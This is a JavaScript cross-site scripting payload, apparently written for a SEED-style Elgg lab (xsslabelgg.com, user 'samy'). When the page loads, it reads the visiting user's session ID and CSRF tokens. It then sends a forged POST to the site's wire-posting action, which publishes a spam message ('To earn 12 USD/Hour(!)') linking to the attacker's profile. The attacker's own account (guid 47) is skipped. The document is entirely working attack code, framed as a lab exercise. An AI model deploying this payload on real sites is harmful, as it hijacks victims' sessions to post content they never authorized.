<script type="text/javascript">
	window.onload = function()
	{
    var guid = "&guid=" + elgg.session.user.guid;
		var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token = "&__elgg_token="+elgg.security.token.__elgg_token;
		var name = "&name="+elgg.session.user.name;
    //Solved the problem approaching the same method as task 2
    var body = "&body=To earn 12 USD/Hour(!), visit now ";
    var link = "http://www.xsslabelgg.com/profile/samy/"
		var sendurl = "http://www.xsslabelgg.com/action/thewire/add";
    var content = token + ts + body + link;
	  if(elgg.session.user.guid != 47){
    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST",sendurl,true);
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send(content);
   	}
  }
</script>
